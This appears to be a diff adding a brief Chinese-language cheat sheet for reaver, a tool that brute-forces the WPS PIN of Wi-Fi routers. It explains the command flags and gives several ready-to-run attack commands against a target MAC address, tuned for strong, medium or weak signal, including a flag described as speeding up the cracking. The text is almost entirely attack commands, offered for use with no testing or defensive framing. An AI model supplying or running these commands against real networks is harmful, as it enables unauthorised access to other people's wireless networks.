@@ -1,0 +1,32 @@
+reaver -i mon0 -b  -c 6 -a -v -S -x 20 -r 100:10 -l 300
+
+Reaver -i mon0 -b xx:xx:xx:xx -vv
+reaver命令参数
+
+-i 监听后接口名称
+
+-b 目标mac地址
+
+-a 自动检测目标AP最佳配置
+
+-S 使用最小的DH key（可以提高PJ速度）
+
+-vv 显示更多的非严重警告
+
+-d 即delay每穷举一次的闲置时间 预设为1秒
+
+-t 即timeout每次穷举等待反馈的最长时间
+
+-c 指定频道可以方便找到信号，如-c1 指定1频道，大家查看自己的目标频道做相应修改 （非TP-LINK路由推荐–d9 –t9 参数防止路由僵死
+示例：
+
+reaver -i mon0 -b MAC -a -S –d9 –t9 -vv
+应因状况调整参数（-c后面都已目标频道为1作为例子） 目标信号非常好:
+
+reaver -i mon0 -b MAC -a -S -vv -d0 -c 1
+目标信号普通:
+
+reaver -i mon0 -b MAC -a -S -vv -d2 -t 5 -c 1
+目标信号一般:
+
+reaver -i mon0 -b MAC -a -S -vv -d5 -c 1
